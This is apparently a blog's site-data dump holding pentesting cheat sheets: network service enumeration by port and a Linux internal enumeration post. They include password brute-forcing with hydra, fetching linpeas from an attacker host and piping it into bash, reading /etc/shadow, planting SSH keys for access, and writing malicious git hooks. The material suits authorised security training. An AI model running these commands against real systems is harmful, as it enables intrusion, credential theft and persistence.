class=\"variable\">$IP</span>\\\\Share --client-protection=off\nsmbclient -U <span class=\"string\">&#x27;user%passwd&#x27;</span> -L //<span class=\"variable\">$IP</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share -U user --pw-nt-hash <span class=\"variable\">$hash</span> -W <span class=\"variable\">$domain</span>\n\n<span class=\"comment\"># download files recursively</span>\nsmbclient <span class=\"string\">&#x27;\\\\\\\\$IP\\\\share&#x27;</span> -N -c <span class=\"string\">&#x27;prompt OFF ; recurse ON ; cd &quot;where\\from&quot; ; lcd &quot;where/to&quot; ; mget *&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>authentication bruteforce</span></div><code class=\"highlight bash\">hydra -L user.txt -P pass.txt <span class=\"variable\">$IP</span> smb\nacccheck -t <span class=\"variable\">$IP</span> -v -u user -P /usr/share/dirb/wordlist/common.txt</code></pre>\n\n<br>\n\n<h2 id=\"Port-143-TCP-993-TCP-IMAP-IMAPS\"><a href=\"#Port-143-TCP-993-TCP-IMAP-IMAPS\" class=\"headerlink\" title=\"Port 143&#x2F;TCP,993&#x2F;TCP - IMAP,IMAPS\"></a>Port 143&#x2F;TCP,993&#x2F;TCP - IMAP,IMAPS</h2><pre><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 143\nopenssl s_client -connect <span class=\"variable\">$IP</span>:993 -quiet</code></pre>\n<pre><div class=\"caption\"><span>GUI applications</span></div><code class=\"highlight bash\">evolution\nthunderbird</code></pre>\n<pre><div class=\"caption\"><span>IMAP commands</span></div><code class=\"highlight bash\"><span class=\"comment\"># login</span>\nA1 LOGIN <span class=\"string\">&quot;username&quot;</span> <span class=\"string\">&quot;password&quot;</span>\n<span class=\"comment\"># list folders/mailboxes</span>\nA1 LIST <span class=\"string\">&quot;&quot;</span> *\nA1 LIST INBOX *\nA1 LIST <span class=\"string\">&quot;Archive&quot;</span> *\n<span class=\"comment\"># select a mailbox</span>\nA1 SELECT INBOX\n<span class=\"comment\"># list messages</span>\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n<span class=\"comment\"># view messages</span>\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])</code></pre>\n<pre><div class=\"caption\"><span>view and download messages with curl</span></div><code class=\"highlight bash\"><span class=\"comment\"># view</span>\ncurl -k <span class=\"string\">&#x27;imaps://$IP/&#x27;</span> --user user:pass\ncurl -k <span class=\"string\">&#x27;imaps://$IP/inbox_name?ALL&#x27;</span> --user user:pass \ncurl -k <span class=\"string\">&#x27;imaps://1.2.3.4/Drafts?TEXT password&#x27;</span> --user user:pass\n<span class=\"comment\"># download</span>\ncurl -k <span class=\"string\">&#x27;imaps://1.2.3.4/Drafts;MAILINDEX=1&#x27;</span> --user user:pass</code></pre>\n<pre><div class=\"caption\"><span>NTLM auth info disclosure</span></div><code class=\"highlight bash\">nmap -p 143,993 --script imap-ntlm-info <span class=\"variable\">$IP</span> -oN recon/nmap.imap-ntlm</code></pre>\n<pre><div class=\"caption\"><span>bruteforce passwords</span></div><code class=\"highlight bash\">hydra -I -V -F -l user -P /usr/share/wordlists/rockyou.txt <span class=\"variable\">$IP</span> imap \nhydra -S -V -l user -P /usr/share/wordlists/rockyou.txt -s 993 <span class=\"variable\">$IP</span> imap</code></pre>\n\n<br>\n\n<h2 id=\"Port-161-TCP-162-UDP-SNMP\"><a href=\"#Port-161-TCP-162-UDP-SNMP\" class=\"headerlink\" title=\"Port 161&#x2F;TCP,162&#x2F;UDP - SNMP\"></a>Port 161&#x2F;TCP,162&#x2F;UDP - SNMP</h2><pre><code class=\"highlight bash\">xprobe2 -v -p udp:161:open <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-389-TCP-636-TCP-3269-TCP-LDAP-tcpwrapped\"><a href=\"#Port-389-TCP-636-TCP-3269-TCP-LDAP-tcpwrapped\" class=\"headerlink\" title=\"Port 389&#x2F;TCP,636&#x2F;TCP,3269&#x2F;TCP - LDAP,tcpwrapped\"></a>Port 389&#x2F;TCP,636&#x2F;TCP,3269&#x2F;TCP - LDAP,tcpwrapped</h2><pre><div class=\"caption\"><span>enumeration</span></div><code class=\"highlight bash\">nmap -n -sV --script <span class=\"string\">&quot;ldap* and not brute&quot;</span> <span class=\"variable\">$IP</span> -oN recon/nmap.ldap</code></pre>\n<pre><div class=\"caption\"><span>ldapsearch</span></div><code class=\"highlight bash\"><span class=\"comment\"># null creds</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;&#x27;</span> -w <span class=\"string\">&#x27;&#x27;</span> -b <span class=\"string\">&quot;DC=domain,DC=name&quot;</span>\n<span class=\"comment\"># authenticate</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;$domain\\user&#x27;</span> -w <span class=\"string\">&#x27;password&#x27;</span> -b <span class=\"string\">&quot;CN=Remote Desktop Users,CN=Builtin,DC=domain,DC=name&quot;</span>\n<span class=\"comment\"># extract info anonymously</span>\nldapsearch -x -H ldaps://<span class=\"variable\">$IP</span>:636/ -s base -b <span class=\"string\">&#x27;&#x27;</span> <span class=\"string\">&quot;(objectClass=*)&quot;</span> <span class=\"string\">&quot;*&quot;</span> +\n<span class=\"comment\"># check admin password if LAPS is enabled</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;$domain\\user&#x27;</span> -w <span class=\"string\">&#x27;password&#x27;</span> -b <span class=\"string\">&quot;dc=domain,dc=name&quot;</span> <span class=\"string\">&quot;(ms-MCS-AdmPwd=*)&quot;</span> ms-MCS-AdmPwd</code></pre>\n\n<br>\n\n<h2 id=\"Port-500-TCP-IKE\"><a href=\"#Port-500-TCP-IKE\" class=\"headerlink\" title=\"Port 500&#x2F;TCP - IKE\"></a>Port 500&#x2F;TCP - IKE</h2><blockquote>\n<p>Internet Key Exchange (IKE), used to establish an IPsec VPN</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ike-scan -M <span class=\"variable\">$IP</span>\nike-scan -M --ikev2 <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-2049-TCP-NFS\"><a href=\"#Port-2049-TCP-NFS\" class=\"headerlink\" title=\"Port 2049&#x2F;TCP - NFS\"></a>Port 2049&#x2F;TCP - NFS</h2><pre><code class=\"highlight bash\">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <span class=\"variable\">$IP</span> -oN recon/nmap.nfs-enum\nnmap --script <span class=\"string\">&quot;nfs-ls, nfs-showmount, nfs-statfs&quot;</span> <span class=\"variable\">$IP</span>- oN recon/nmap.nfs-list</code></pre>\n<pre><code class=\"highlight bash\">showmount -e <span class=\"variable\">$IP</span>\nmsfconsole -q -x <span class=\"string\">&quot;use auxiliary/scanner/nfs/nfsmount; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span>\n<span class=\"comment\"># check config files</span>\n<span class=\"comment\"># /etc/exports</span>\n<span class=\"comment\"># /etc/lib/nfs/etab</span></code></pre>\n<pre><div class=\"caption\"><span>mount/unmount shares</span></div><code class=\"highlight bash\"><span class=\"comment\"># create mount point</span>\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">mkdir</span> /mnt/local_share\n<span class=\"comment\"># mount the opn share</span>\n<span class=\"built_in\">sudo</span> mount -t nfs -o rw,vers=2 <span class=\"variable\">$IP</span>:/share_name /mnt/local_share\n<span class=\"comment\"># unmount share</span>\n<span class=\"built_in\">sudo</span> umount /mnt/nfs-share\n\n<span class=\"comment\"># match the user with UID and GID if mounting a share with restricted permissions</span>\npython2 ~/tools/NfSpy/nfspy.py -o server=<span class=\"variable\">$IP</span>:/share_name,nfsport=2049/tcp,rw /mnt/local_share</code></pre>\n\n<br>\n\n<h2 id=\"Port-3306-TCP-MySQL\"><a href=\"#Port-3306-TCP-MySQL\" class=\"headerlink\" title=\"Port 3306&#x2F;TCP - MySQL\"></a>Port 3306&#x2F;TCP - MySQL</h2><pre><code class=\"highlight bash\">nmap -sV -Pn -T4 -vv -script=mysql* <span class=\"variable\">$IP</span> -p 3306 -oN recon/nmap.mysql</code></pre>\n<pre><div class=\"caption\"><span>interact with the DB</span></div><code class=\"highlight bash\">mysql -u<span class=\"string\">&#x27;root&#x27;</span> -p<span class=\"string\">&#x27;root&#x27;</span> -h <span class=\"variable\">$IP</span> -D database\nsqlitebrowser</code></pre>\n<pre><code class=\"highlight sql\"><span class=\"keyword\">show</span> databases;\nuse db_name;\n<span class=\"keyword\">show</span> tables;\n<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> table_name;\n<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> table_name \\G</code></pre>\n<pre><div class=\"caption\"><span>check for credentials</span></div><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -name wp-config.php 2&gt;/dev/null</code></pre>\n\n<br>\n\n<h2 id=\"Port-3389-TCP-RDP\"><a href=\"#Port-3389-TCP-RDP\" class=\"headerlink\" title=\"Port 3389&#x2F;TCP - RDP\"></a>Port 3389&#x2F;TCP - RDP</h2><pre><div class=\"caption\"><span>authenticate</span></div><code class=\"highlight bash\">xfreerdp /u:username /p:<span class=\"string\">&#x27;password&#x27;</span> /v:<span class=\"variable\">$IP</span> /f +clipboard <span class=\"comment\"># /d:domain /cert:ignore</span>\nrdesktop <span class=\"variable\">$IP</span> -d <span class=\"variable\">$domain</span> -u <span class=\"variable\">$username</span> -p <span class=\"string\">&#x27;$password&#x27;</span>\nremmina -c rdp://user@<span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>check credentials</span></div><code class=\"highlight bash\">impacket-rdp_check <span class=\"variable\">$domain</span>/<span class=\"variable\">$username</span>:<span class=\"variable\">$password</span>@<span class=\"variable\">$IP</span>\n<span class=\"comment\"># look for an username upon connecting</span>\nrdesktop -u <span class=\"string\">&quot;&quot;</span> -a <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-6667-TCP-6697-TCP-IRC\"><a href=\"#Port-6667-TCP-6697-TCP-IRC\" class=\"headerlink\" title=\"Port 6667&#x2F;TCP,6697&#x2F;TCP - IRC\"></a>Port 6667&#x2F;TCP,6697&#x2F;TCP - IRC</h2><pre><div class=\"caption\"><span>manual inspection</span></div><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 6667 <span class=\"comment\"># connect to server</span>\nUSER admin * 0 admin ; NICK admin <span class=\"comment\"># authenticate</span>\nadmin? ADMIN <span class=\"comment\"># list commands</span></code></pre>\n<pre><div class=\"caption\"><span>irssi</span></div><code class=\"highlight bash\">irssi -c <span class=\"variable\">$IP</span> -p 6697 - /exit</code></pre>\n\n<br>\n\n<h2 id=\"Port-11211-TCP-memcache\"><a href=\"#Port-11211-TCP-memcache\" class=\"headerlink\" title=\"Port 11211&#x2F;TCP - memcache\"></a>Port 11211&#x2F;TCP - memcache</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;stats items&quot;</span> | nc -vn -w 1 <span class=\"variable\">$IP</span> 11211  <span class=\"comment\"># Get items of slabs with info</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;get &lt;item_name&gt;&quot;</span> | nc -vn -w 1 <span class=\"variable\">$IP</span> 11211  <span class=\"comment\"># Get saved info</span></code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"5. Internal enumeration - Linux","date":"2024-08-02T10:00:00.000Z","toc":true,"_content":"\n---\nStep 5 in a penetration test: Internal enumeration.\nFind as much relevant info about the target: networking, services, administration, file system.\n\n---\n<!-- more -->\n\n<br>\n\n\n## Interactive shell\nCheck python version\n```bash\nwhich python\nwhich python3\n```\n\nPython bash TTY\n```bash\npython -c \"import pty;pty.spawn('/bin/bash')\" \npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\nExport TTY\n```bash\nCTRL + Z \nstty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;\n```\n\nAdds-on\n```bash\nexport TERM=xterm\nstty rows 54 columns 237\nalias ll='clear;ls -lsah --color=auto'\n```\n\nAnother quick, optimized shell\n```bash\nscript -q /dev/null\n```\n\n<br>\n\n## Automated enumeration\nDownload `linpeas`\n```bash host a python server\nwget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh -O ~/tools/linpeas.sh\ncd ~/tools\nchmod +x linpeas.sh\npython3 -m http.server 8000\n```\n```bash run the script without writing to the disk\nwget -O - http://10.10.14.10:8000/linpeas.sh | bash\n```\n```bash save the script and output\nwget http://10.10.14.10:8000/linpeas.sh -O /dev/shm/linpeas.sh\nbash /dev/shm/linpeas.sh > /dev/shm/linpeas.out\n```\n\n<br>\n\n## System info\n```bash\n# issue, release\ncat /etc/issue\ncat /etc/*-release\n\n# distribution, version number\ncat /etc/os-release\n\n# kernel\nuname -a\nuname -smr\n\n# arch\nfile /bin/bash\n```\n```bash\n# system name\nhostname\n\n# users\ncat /etc/passwd | grep 'sh$'\n\n# environment\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\nls -lsa ~/.Xauthority # display misconfiguration?\n```\nOpen files\n```bash\nsudo lsof\n```\nDocker environment\n```bash\ngrep -Ri docker /proc --color=auto 2>/dev/null\nls -lsah /etc | grep -i docker\n```\nInstalled applications\n```bash\nls -lsah /usr/bin/\nls -lsah /sbin/\n```\nInstalled packages\n```bash\ndpkg -l # debian\nrpm -qa # RPM\n```\n\n<br>\n\n## Filesystem\nFiles\n```bash\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ncat /etc/crontab\ncat /etc/update-motd.d \nls -lsah /etc/passwd\nls -lsah /etc/sudoers \n```\nDirectories\n```bash\nls -lsahR /home/\nls -lsah ~/.ssh/\nls -lsah /var/lib/\nls -lsah /var/db/\nls -lsah /opt/\nls -lsah /tmp/\nls -lsah /var/tmp/\nls -lsah /dev/shm/\nls -lsah /var/mail/\nls -lsah /etc/cron.*\nls -lsah /proc\n```\nCheck for passwords\n```bash\nls -lsah /var/apache2\nls -lsah /var/lib/mysql/mysql\n```\nFiles recently created or modified\n```bash created or modified in the last 5 days\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\nWrite permissions to files in /etc/ - try to reconfigure services\n```bash\nls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null      # Anyone\nls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner\nls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group\nls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other\nfind /etc/ -readable -type f 2>/dev/null             # Anyone\nfind /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone\n```\nMounted files\n```bash\nmount\ndf -h\n```\nUnmounted file-systems\n```bash\ncat /etc/fstab\n```\nWritable \"message of the day\"\n```bash\nls -lsah /etc/update-motd.d\n```\nFiles owned by the current user\n```bash\nfind / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc\n```\nFiles created or modified in the last 5 days\n```bash\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\nDisplay configuration with `.Xauthority` and `.xsession` files\n```bash\necho $Xauthority\nexport Xauthority=/home/$(whoami)/.Xauthority\n```\nUse X11 forwarding to capture the display remotely\n```bash\nxwd -root -screen -silent -display :0 > /tmp/screen.xwd\nconvert screen.xwd screen.png\n```\n\n<br>\n\n## Services\nProcesses\n```bash\nps\nps aux | grep -i 'root' --color=auto\nps axjf \nps ef | grep -i root\n```\nFilter using `grep`\n```markdown\n-e \tevery process\n-f \tfull format\n-l \tlong format\n-u \tdetails about user\n-j \tjobs\n-f \tforest  more visual\n```\nScan processes\n```bash\nwget http://10.10.14.10:8000/pspy64 -O /dev/shm/pspy64\nchmod +x /dev/shm/pspy64\n/dev/shm/pspy64\n\nwget http://10.10.14.10:8000/pspy32 -O /dev/shm/pspy32\nchmod +x /dev/shm/pspy32\n/dev/shm/pspy32\n```\nCronjobs\n```bash\ncrontab -l\nls -lsah /var/spool/cron\nls -lsah /etc/ | grep cron\nls -lsah /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n```\n\n<br>\n\n## Network\nIP addresses\n```bash\nip a s\nifconfig -a\n```\nInterfaces\n```bash\ncat /etc/network/interfaces\ncat /etc/sysconfig/network\n```\nDNS server\n```bash\ncat /etc/resolf.conf\n```\nRouting table\n```bash\nnetstat -rn \n```\nARP table\n```bash\narp -a\nroute\nroute -nee\n```\nNetwork connections information\n```bash\nss\nss -tunlp\nsudo netstat\nsudo netstat -atunp\nsudo netstat -antpx\nsudo netstat -tulpn\nnetstat -tunlp | grep 127.0.0.1  # internal services such as MySQL\n```\n| -a  | show both listening and non-listening sockets |\n| --- | --- |\n| -l | show only listening sockets |\n| -n | show numeric output instead of resolving the IP address and port number |\n| -t | TCP |\n| -u | UDP |\n| -x | UNIX |\n| -p | Show the PID and name of the program to which the socket belongs |\n\n\nDisplay internet and network connections\n```bash\nsudo lsof -i \n\n# limit to a single port\nsudo lsof -i :25\n```\nList printers\n```bash\nlpstat -a\n```\nFrom dynamic config files\n```bash\ncat /proc/net/fib_trie # IPv4 addresses\ncat /proc/net/tcp      # hex-encoded port data\n```\nView all TCP connections by non-user accounts\n```bash\nsudo bpftrace -e 'kprobe:tcp_connect { if (uid < 1000) { @[uid] = count(); } }'\n```\n\n<br>\n\n## Users\nLogged in users\n```bash\nwho\nw\nlast\n\nwhoami\nid\n```\nFiles owned by current user\n```bash\nfind / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc\n```\nAuthorize our own public key for access\n```bash\n# locally\nssh-keygen -o\n# from local to remote \nscp ~/.ssh/id_rsa.pub remote-user@10.10.10.10:~/.ssh/\n# remote\ncat ~/.ssh/id_rsa.pub >> authorized_keys \n```\n\n<br>\n\nScript to list users\n```bash list_users.sh\n#!/bin/bash\n\necho \"System users and last authentication date:\"\necho \"-----------------------------------------------------\"\n\nwhile IFS=: read -r user _ uid _ _ home shell; do\n    if [[ \"$shell\" =~ sh$ ]]; then\n        last_logon=$(last -n 1 -R \"$user\" | head -n 1 | awk '{print $4, $5, $6}')\n        echo \"Username: $user\"\n        echo \"UID: $uid\"\n        echo \"Home dir: $home\"\n        echo \"Shell: $shell\"\n        echo \"Last login: $last_logon\"\n        echo \"-----------------------------------------------------\"\n    fi\ndone < /etc/passwd\n```\n\n<br>\n\n## Credentials\n```bash Eviltree\n# regex\npython3 eviltree.py -r $dir -x \".{0,3}passwd.{0.3}[=]{1}.{0,18}\" -A -q -i -v\n# keywords\npython3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v\n```\n```bash Scavanger\nsudo python2 ~/tools/scavanger/scavenger.py smb -t $IP -u $username -p '$pass' -d $domain\n```\n\n<br>\n\n## Others\nGit commits\n```bash\ngit log        # list commits\ngit log -p     # the patch output\ngit log -p -2  # last 2 entries\ngit log --stat # view stats\n```\nExploit git hooks\n```bash pre-commit hook\necho -e \"#!/bin/sh\\nmalicious_command\" > .git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\n```\n```bash post-checkout hook\necho -e \"#!/bin/sh\\nmalicious_command\" > .git/hooks/post-checkout\nchmod +x .git/hooks/post-checkout\n\n```\n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/5.md","raw":"---\ntitle: 5. Internal enumeration - Linux\ndate: 2024-08-02 13:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Internal enumeration\ntoc: true\n---\n\n---\nStep 5 in a penetration test: Internal enumeration.\nFind as much relevant info about the target: networking, services, administration, file system.\n\n---\n<!-- more -->\n\n<br>\n\n\n## Interactive shell\nCheck python version\n```bash\nwhich python\nwhich python3\n```\n\nPython bash TTY\n```bash\npython -c \"import pty;pty.spawn('/bin/bash')\" \npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\nExport TTY\n```bash\nCTRL + Z \nstty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;\n```\n\nAdds-on\n```bash\nexport TERM=xterm\nstty rows 54 columns 237\nalias ll='clear;ls -lsah --color=auto'\n```\n\nAnother quick, optimized shell\n```bash\nscript -q /dev/null\n```\n\n<br>\n\n## Automated enumeration\nDownload `linpeas`\n```bash host a python server\nwget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh -O ~/tools/linpeas.sh\ncd ~/tools\nchmod +x linpeas.sh\npython3 -m http.server 8000\n```\n```bash run the script without writing to the disk\nwget -O - http://10.10.14.10:8000/linpeas.sh | bash\n```\n```bash save the script and output\nwget http://10.10.14.10:8000/linpeas.sh -O /dev/shm/linpeas.sh\nbash /dev/shm/linpeas.sh > /dev/shm/linpeas.out\n```\n\n<br>\n\n## System info\n```bash\n# issue, release\ncat /etc/issue\ncat /etc/*-release\n\n# distribution, version number\ncat /etc/os-release\n\n# kernel\nuname -a\nuname -smr\n\n# arch\nfile /bin/bash\n```\n```bash\n# system name\nhostname\n\n# users\ncat /etc/passwd | grep 'sh$'\n\n# environment\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\nls -lsa ~/.Xauthority # display misconfiguration?\n```\nOpen files\n```bash\nsudo lsof\n```\nDocker environment\n```bash\ngrep -Ri docker /proc --color=auto 2>/dev/null\nls -lsah /etc | grep -i docker\n```\nInstalled applications\n```bash\nls -lsah /usr/bin/\nls -lsah /sbin/\n```\nInstalled packages\n```bash\ndpkg -l # debian\nrpm -qa # RPM\n```\n\n<br>\n\n## Filesystem\nFiles\n```bash\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ncat /etc/crontab\ncat /etc/update-motd.d \nls -lsah /etc/passwd\nls -lsah /etc/sudoers \n```\nDirectories\n```bash\nls -lsahR /home/\nls -lsah ~/.ssh/\nls -lsah /var/lib/\nls -lsah /var/db/\nls -lsah /opt/\nls -lsah /tmp/\nls -lsah /var/tmp/\nls -lsah /dev/shm/\nls -lsah /var/mail/\nls -lsah /etc/cron.*\nls -lsah /proc\n```\nCheck for passwords\n```bash\nls -lsah /var/apache2\nls -lsah /var/lib/mysql/mysql\n```\nFiles recently created or modified\n```bash created or modified in the last 5 days\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\nWrite permissions to files in /etc/ - try to reconfigure services\n```bash\nls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null      # Anyone\nls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner\nls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group\nls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other\nfind /etc/ -readable -type f 2>/dev/null             # Anyone\nfind /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone\n```\nMounted files\n```bash\nmount\ndf -h\n```\nUnmounted file-systems\n```bash\ncat /etc/fstab\n```\nWritable \"message of the day\"\n```bash\nls -lsah /etc/update-motd.d\n```\nFiles owned by the current user\n```bash\nfind / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc\n```\nFiles created or modified in the last 5 days\n```bash\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\nDisplay configuration with `.Xauthority` and `.xsession` files\n```bash\necho $Xauthority\nexport Xauthority=/home/$(whoami)/.Xauthority\n```\nUse X11 forwarding to capture the display remotely\n```bash\nxwd -root -screen -silent -display :0 > /tmp/screen.xwd\nconvert screen.xwd screen.png\n```\n\n<br>\n\n## Services\nProcesses\n```bash\nps\nps aux | grep -i 'root' --color=auto\nps axjf \nps ef | grep -i root\n```\nFilter using `grep`\n```markdown\n-e \tevery process\n-f \tfull format\n-l \tlong format\n-u \tdetails about user\n-j \tjobs\n-f \tforest  more visual\n```\nScan processes\n```bash\nwget http://10.10.14.10:8000/pspy64 -O /dev/shm/pspy64\nchmod +x /dev/shm/pspy64\n/dev/shm/pspy64\n\nwget http://10.10.14.10:8000/pspy32 -O /dev/shm/pspy32\nchmod +x /dev/shm/pspy32\n/dev/shm/pspy32\n```\nCronjobs\n```bash\ncrontab -l\nls -lsah /var/spool/cron\nls -lsah /etc/ | grep cron\nls -lsah /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n```\n\n<br>\n\n## Network\nIP addresses\n```bash\nip a s\nifconfig -a\n```\nInterfaces\n```bash\ncat /etc/network/interfaces\ncat /etc/sysconfig/network\n```\nDNS server\n```bash\ncat /etc/resolf.conf\n```\nRouting table\n```bash\nnetstat -rn \n```\nARP table\n```bash\narp -a\nroute\nroute -nee\n```\nNetwork connections information\n```bash\nss\nss -tunlp\nsudo netstat\nsudo netstat -atunp\nsudo netstat -antpx\nsudo netstat -tulpn\nnetstat -tunlp | grep 127.0.0.1  # internal services such as MySQL\n```\n| -a  | show both listening and non-listening sockets |\n| --- | --- |\n| -l | show only listening sockets |\n| -n | show numeric output instead of resolving the IP address and port number |\n| -t | TCP |\n| -u | UDP |\n| -x | UNIX |\n| -p | Show the PID and name of the program to which the socket belongs |\n\n\nDisplay internet and network connections\n```bash\nsudo lsof -i \n\n# limit to a single port\nsudo lsof -i :25\n```\nList printers\n```bash\nlpstat -a\n```\nFrom dynamic config files\n```bash\ncat /proc/net/fib_trie # IPv4 addresses\ncat /proc/net/tcp      # hex-encoded port data\n```\nView all TCP connections by non-user accounts\n```bash\nsudo bpftrace -e 'kprobe:tcp_connect { if (uid < 1000) { @[uid] = count(); } }'\n```\n\n<br>\n\n## Users\nLogged in users\n```bash\nwho\nw\nlast\n\nwhoami\nid\n```\nFiles owned by current user\n```bash\nfind / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc\n```\nAuthorize our own public key for access\n```bash\n# locally\nssh-keygen -o\n# from local to remote \nscp ~/.ssh/id_rsa.pub remote-user@10.10.10.10:~/.ssh/\n# remote\ncat ~/.ssh/id_rsa.pub >> authorized_keys \n```\n\n<br>\n\nScript to list users\n```bash list_users.sh\n#!/bin/bash\n\necho \"System users and last authentication date:\"\necho \"-----------------------------------------------------\"\n\nwhile IFS=: read -r user _ uid _ _ home shell; do\n    if [[ \"$shell\" =~ sh$ ]]; then\n        last_logon=$(last -n 1 -R \"$user\" | head -n 1 | awk '{print $4, $5, $6}')\n        echo \"Username: $user\"\n        echo \"UID: $uid\"\n        echo \"Home dir: $home\"\n        echo \"Shell: $shell\"\n        echo \"Last login: $last_logon\"\n        echo \"-----------------------------------------------------\"\n    fi\ndone < /etc/passwd\n```\n\n<br>\n\n## Credentials\n```bash Eviltree\n# regex\npython3 eviltree.py -r $dir -x \".{0,3}passwd.{0.3}[=]{1}.{0,18}\" -A -q -i -v\n# keywords\npython3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v\n```\n```bash Scavanger\nsudo python2 ~/tools/scavanger/scavenger.py smb -t $IP -u $username -p '$pass' -d $domain\n```\n\n<br>\n\n## Others\nGit commits\n```bash\ngit log        # list commits\ngit log -p     # the patch output\ngit log -p -2  # last 2 entries\ngit log --stat # view stats\n```\nExploit git hooks\n```bash pre-commit hook\necho -e \"#!/bin/sh\\nmalicious_command\" > .git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\n```\n```bash post-checkout hook\necho -e \"#!/bin/sh\\nmalicious_command\" > .git/hooks/post-checkout\nchmod +x .git/hooks/post-checkout\n\n```\n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/5","published":1,"updated":"2024-09-23T06:18:55.858Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhi00086gvgchk9ew08","content":"<hr>\n<p>Step 5 in a penetration test: Internal enumeration.<br>Find as much relevant info about the target: networking, services, administration, file system.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n<h2 id=\"Interactive-shell\"><a href=\"#Interactive-shell\" class=\"headerlink\" title=\"Interactive shell\"></a>Interactive shell</h2><p>Check python version</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">which</span> python\n<span class=\"built_in\">which</span> python3</code></pre>\n\n<p>Python bash TTY</p>\n<pre><code class=\"highlight bash\">python -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> \npython3 -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></code></pre>\n\n<p>Export TTY</p>\n<pre><code class=\"highlight bash\">CTRL + Z \n<span class=\"built_in\">stty</span> raw -<span class=\"built_in\">echo</span>; <span class=\"built_in\">fg</span>; <span class=\"built_in\">export</span> SHELL=/bin/bash; <span class=\"built_in\">export</span> TERM=xterm-256color; <span class=\"built_in\">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;</code></pre>\n\n<p>Adds-on</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> TERM=xterm\n<span 